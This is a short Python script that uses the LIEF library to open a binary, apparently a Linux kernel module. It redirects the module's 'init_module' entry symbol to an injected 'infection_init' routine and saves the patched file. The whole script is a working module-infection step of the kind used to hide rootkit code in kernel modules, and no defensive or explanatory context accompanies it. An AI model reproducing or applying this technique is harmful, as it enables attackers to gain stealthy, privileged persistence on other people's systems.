import sys
import lief
binary = lief.parse(sys.argv[1])


init_module = None
infection_init = None

for symbol in binary.symbols:
    match symbol.name:
        case 'init_module':
            init_module = symbol
        case 'infection_init':
            infection_init = symbol
        case _:
            continue

init_module.value = infection_init.value

binary.write(sys.argv[2])
